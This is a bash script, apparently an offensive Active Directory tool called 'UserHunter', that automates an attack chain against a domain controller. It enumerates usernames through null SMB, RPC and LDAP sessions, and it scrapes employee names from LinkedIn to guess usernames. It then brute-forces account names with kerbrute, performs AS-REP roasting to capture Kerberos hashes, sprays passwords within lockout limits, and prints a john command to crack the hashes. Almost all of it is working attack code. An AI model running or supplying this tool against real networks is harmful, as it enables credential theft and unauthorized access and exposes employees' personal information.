#!/bin/bash

ft_echo (){
    echo -e "\e[1;93m[$(date +'%H:%M:%S')]\e[0m $1"
}

banner="
  _    _               _    _             _            
 | |  | |             | |  | |           | |           
 | |  | |___  ___ _ __| |__| |_   _ _ __ | |_ ___ _ __ 
 | |  | / __|/ _ \ '__|  __  | | | | '_ \| __/ _ \ '__|
 | |__| \__ \  __/ |  | |  | | |_| | | | | ||  __/ |   
  \____/|___/\___|_|  |_|  |_|\__,_|_| |_|\__\___|_|   
                                                       
                        by \e[1;31mIsmail Barrous\e[0m
                           Version: \e[1;31m1.0\e[0m         
"
ping_host() {
    res=$(ping -c 3 -W 5 "$1")
    if [[ "$res" == *"100% packet loss"* ]]; then
        return 0
    else
        return 1
    fi
}

prompt_user() {
    while true; do
        read -p "$1 [y/n]: " yn
        case $yn in
            [Yy]* ) return 0;;
            [Nn]* ) return 1;;
            * ) echo "Please answer yes or no.";;
        esac
    done
}

verbose_output() {
    local var="$1"
    while IFS= read -r line; do
        echo -e "\e[92m[+]\e[0m $line"
    done <<< "$var"
}

#Function to perform Password Spraying
Password_Spraying()
{
    ft_echo "\e[1;34m[*Password Spraying*]\e[0m Fetching Password Policy..."
    #Extracting Password Policies with crackmapexec
    policy=$(crackmapexec smb "$1" --pass-pol -u "" -p "" 2>/dev/null)
    lockout=$(echo "$policy" | grep "Reset Account Lockout Counter" | awk -F "Reset Account Lockout Counter:" '{print $2}' | awk '{print $1}' | sed 's/\x1b\[0m//g')
    threshold=$(echo "$policy" | grep "Account Lockout Threshold" | awk -F "Account Lockout Threshold:" '{print $2}' | awk '{print $1}' | sed 's/\x1b\[0m//g')
    length=$(echo "$policy" | grep "Minimum password length" | awk -F "Minimum password length:" '{print $2}' | awk '{print $1}' | sed 's/\x1b\[0m//g')
    if [ -z "$lockout" ] && [ -z "$threshold" ] && [ -z "$length" ]; then
        ft_echo "\e[1;31mNo password policies were Found !\e[0m"
        if ! prompt_user "$(ft_echo "\e[1;32mWould you like to use Default Password Policy Instead ?(This might lock some accounts if the policies don't match)")";then
            echo -n -e "\e[0m"
            exit
        fi
        echo -n -e "\e[0m"
        #Setting Up Default Password Policies
        lockout="30"
        threshold="0"
        length="7"
    else
        if [ "$threshold" == "None" ]; then
            threshold="0"
        fi
        if [ "$length" == "None" ]; then
            length="0"
        fi
        ft_echo "\e[1;32mSuccessful Fetching !\e[0m"
    fi
    if $4; then
        verbose_output "$(echo -e "\e[1mReset Account Lockout Counter :\e[0m $lockout minutes \
        \n\e[1mAccount Lockout Threshold :\e[0m $threshold \
        \n\e[1mMinimum password length :\e[0m $length")"
    fi
    #Checking the passwords file existence
    if [ -z "$3" ]; then
        ft_echo "\e[1;31mNo passwords list was specified !\e[0m"
        read -p "$(ft_echo "\e[1;32mPlease provide the absolute path of the password list:\e[0m")" passwords_list_path
    else
        passwords_list_path="$3"
    fi
    if [ ! -f "$passwords_list_path" ]; then
        ft_echo "\e[1;31mInvalid path or file does not exist ! ($passwords_list_path)\e[0m"
        exit 1
    fi
    ft_echo "\e[1;34m[*Password Spraying*]\e[0m Performing password spraying..."
    spray=$(python3 tools/CME-Password-Spraying.py -u usernames.txt -p "$passwords_list_path" -t $threshold -l "$lockout" -d "$2" -pl "$length" | grep "Found password")
    if [ -z "$spray" ]; then
        ft_echo "\e[1;31mno results were found.\e[0m"
        exit
    fi
    echo "$spray"
}

# Function to enumerate usernames using crackmapexec with credentials
enumerate_crackmapexec_with_null_sess() {
    crackmapexec smb "$1" --users -u "" -p "" 2>/dev/null | awk '{print $5}' | awk -F "\\" '{print $2}' #awk -F "\\" '{if (NF > 1) print $2; else print $0}'
}

# Function to enumerate usernames using rpcclient with credentials
enumerate_rpcclient_with_null_sess() {
    rpcclient -U '' -N -c enumdomusers "$1" 2>/dev/null | grep 'user:' | awk '{print $1}' | awk -F "[][]" '{print $2}'
}

# Function to enumerate usernames using ldapsearch with credentials
enumerate_ldapsearch_with_null_bind() {
    ldapsearch -x -H "ldap://$1" -D "" -w "" -b "$3" -s sub "(objectclass=user)" 'sAMAccountName' 2>/dev/null | grep "sAMAccountName:" | awk '{print $2}'
}

# Function to bruteforce a list of usernames
brute_force_usernames() {
    ./tools/kerbrute userenum -d $2 --dc $1 -v "$3" -t 50 | grep '+' | awk {'print $7'} | awk -F '@' '{print $1}'
}

# Function to perform OSINT on the company's employees names
gather_usernames_with_osint() {
    python3 tools/crosslinked/crosslinked.py -f '{first}-{last}' $1
}

# Function to generate surnames based on the results from the OSINT operation
generate_surnames(){
    python3 tools/ADGenerator.py tools/surnames.txt > surnames.txt
    rm tools/surnames.txt && rm names.txt && rm names.csv
}

# Function to perform ASREP Roasting
as_rep_roasting(){
    impacket-GetNPUsers $2/ -format john -usersfile $3 -dc-ip $1 | grep 'krb5asrep'
}

helper_message() {
    echo "Usage: $0 [options]"
    echo "Options:"
    echo "  -t, --target       Specify the target IP address"
    echo "  -d, --domain       Specify the domain"
    echo "  -c, --company-name Specify the company name (optional)"
    echo "  -ul, --usernames-list Specify the usernames list to bruteforce (optional)"
    echo "  -pl, --passwords-list Specify the password list (optional)"
    echo "  -h, --help         Display this help message"
}

# Main function
main() {
    target=""
    domain=""
    search_base=""
    company_name=""
    passwords_list=""
    usernames_list=""
    verbose=false

    if [[ $# -eq 1 && ($1 == "-h" || $1 == "--help") || $# -eq 0 ]]; then
        helper_message
        exit 0
    fi

    while [[ $# -gt 0 ]]; do
        key="$1"
        case $key in
            -t|--target)
            target="$2"
            shift
            shift
            ;;
            -d|--domain)
            domain="$2"
            shift
            shift
            ;;
            -c|--company-name)
            company_name="$2"
            shift
            shift
            ;;
            -ul|--usernames-list)
            usernames_list="$2"
            shift
            shift
            ;;
            -v|--verbose)
            verbose=true
            shift
            ;;
            -pl|--passwords-list)
            passwords_list="$2"
            shift
            shift
            ;;
            *)
            echo "Unknown option: $1"
            helper_message
            exit 1
            ;;
        esac
    done
    # Check if required parameters are provided
    if [[ -z $target || -z $domain ]]; then
        echo "Error: Please provide the required parameters: target_IP, username, password, domain, and search_base."
        exit 1
    fi

    wordlists=(
    "/usr/share/wordlists/statistically-likely-usernames/jsmith.txt"
    "/usr/share/wordlists/rockyou.txt"
    "/usr/share/wordlists/metasploit/unix_users.txt"
    )

    search_base="DC=$(echo "$domain" | sed 's/\./,DC=/g')"
    
    if [ -n "$usernames_list" ]; then
        wordlists=("$(realpath "$usernames_list" 2>/dev/null)" "${wordlists[@]}")
    fi
    
    if [ -n "$passwords_list" ]; then
        passwords_list="$(realpath "$passwords_list" 2>/dev/null)"
    fi

    filename="usernames.txt"
    
    echo -e "$banner"

    #checking if the target ip and domain are reachable
    target_reach=1
    domain_reach=1

    if ping_host "$target" == 0; then
        target_reach=0
        ft_echo "\e[1;31mTarget ($target) is unreachable !\e[0m"
    fi

    if ping_host "$domain" == 0; then
        domain_reach=0
        ft_echo "\e[1;31mDomain ($domain) is unreachable !\e[0m"
    fi
    if [ $target_reach == 0 ] && [ $domain_reach == 0 ]; then
        if ! prompt_user "$(ft_echo "\e[1;32mWould you like to continue ?")";then
            echo -n -e "\e[0m"
            exit
        fi
        echo -n -e "\e[0m"
    fi
    #Enumerating and Gathering Usernames from AD Protocols
    ft_echo "\e[1;34m[*SMB*]\e[0m Enumerating usernames with Null Session..."
    output_crackmapexec=$(enumerate_crackmapexec_with_null_sess "$target")
    if [ -z "$output_crackmapexec" ]; then
        ft_echo "\e[1;31mno results were found.\e[0m"
    else
        ft_echo "\e[1;32mSuccessful Enumeration ! $(echo "$output_crackmapexec" | wc -l) Usernames Found!\e[0m"
        if $verbose; then
            verbose_output "$output_crackmapexec"
        fi
    fi
    
    ft_echo "\e[1;34m[*RPC*]\e[0m Enumerating usernames with Null Session..."
    output_rpcclient=$(enumerate_rpcclient_with_null_sess "$target")
    if [ -z "$output_rpcclient" ]; then
        ft_echo "\e[1;31mno results were found.\e[0m"
    else
        ft_echo "\e[1;32mSuccessful Enumeration ! $(echo "$output_rpcclient" | wc -l) Usernames Found!\e[0m"
        if $verbose; then
            verbose_output "$output_rpcclient"
        fi
    fi
    
    ft_echo "\e[1;34m[*LDAP*]\e[0m Enumerating usernames with Null Bind..."
    output_ldapsearch=$(enumerate_ldapsearch_with_null_bind "$target" "$domain" "$search_base")
    if [ -z "$output_ldapsearch" ]; then
        ft_echo "\e[1;31mno results were found.\e[0m"
    else
        ft_echo "\e[1;32mSuccessful Enumeration ! $(echo "$output_ldapsearch" | wc -l) Usernames Found!\e[0m"
        if $verbose; then
            verbose_output "$output_ldapsearch"
        fi
    fi

    # Running an OSINT operation if the enumeration above failed
    if [ -z "$output_ldapsearch" ] && [ -z "$output_rpcclient" ] && [ -z "$output_crackmapexec" ]; then
        if [ -z "$company_name" ]; then
            ft_echo "\e[1;31m[*OSINT*] No Company Name was specified.\e[0m"  
        else 
            ft_echo "\e[1;34m[*OSINT*]\e[0m Gathering usernames of \e[1;34m$company_name\e[0m's employees from Linkedin..."
            osint_output=$(gather_usernames_with_osint "$company_name" 2>/dev/null)
            if [[ "$osint_output" == *"No results found"* ]]; then
                rm names.txt && rm names.csv
                ft_echo "\e[1;31mno results were found.\e[0m"
            else
                tr -d ',' < names.txt | tr '-' ',' > tools/surnames.txt
                ft_echo "\e[1;32mSuccessful Enumeration ! $(wc -l "names.txt" | awk '{print $1}') Usernames Found!\e[0m"
                if $verbose; then
                    verbose_output "$(cat "names.txt")"
                fi
                ft_echo "\e[1;34m[*OSINT*]\e[0m Generating surnames Based on the results..."
                generate_surnames
                ft_echo "\e[1;32mSuccessful Generation ! $(wc -l "surnames.txt" | awk '{print $1}') Surnames Generated!!\e[0m"
                wordlists=("$(realpath "surnames.txt")" "${wordlists[@]}")
            fi
        fi
        # Brute Forcing a list of usernames to check whether they are valid or not.
        ft_echo "\e[1;34m[*Brute Force*]\e[0m Brute Forcing wordlists..."
        for wordlist in "${wordlists[@]}"; do
            ft_echo "Current Wordlist: \e[1;32m$wordlist\e[0m"
            brute_force=$(brute_force_usernames "$target" "$domain" "$wordlist")
            if [ -z "$brute_force" ]; then
                ft_echo "\e[1;31mno results were found.\e[0m"
            else
                echo -e "$brute_force" > "$filename"
                ft_echo "\e[1;32mSuccessful Bruteforce ! $(wc -l "$filename" | awk '{print $1}') valid usernames were found !\e[0m"
                if $verbose; then
                    verbose_output "$brute_force"
                fi
                break
            fi
        done
    else
        echo -e "$output_crackmapexec\n$output_rpcclient\n$output_ldapsearch" | sort | uniq > "$filename"
    fi
    #Running an AS_REP Roasting Check on found usernames
    if [ -f "$(realpath $filename)" ]; then
        ft_echo "\e[1;34m[*AS_REP*]\e[0m Performing AS_REP Roasting with the valid list of usernames."
        asrep_output=$(as_rep_roasting "$target" "$domain" "$filename")
        # Running a Password Spraying Operation if no results were concluded from AS_REP Roasting
        if [ -z "$asrep_output" ]; then
            ft_echo "\e[1;31mno results were found.\e[0m"
            Password_Spraying "$target" "$domain" "$passwords_list" "$verbose"
        else       
            echo -e "$asrep_output" > hashes.txt
            ft_echo "\e[1;32mSuccessful Roasting ! $(wc -l "hashes.txt" | awk '{print $1}') hashes were found !\e[0m"
            if $verbose; then
                verbose_output "$asrep_output"
            fi
            ft_echo "Run the following command to crack the hashes : \e[1;35mjohn hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep\e[0m"       
        fi
    fi
}

main "$@"
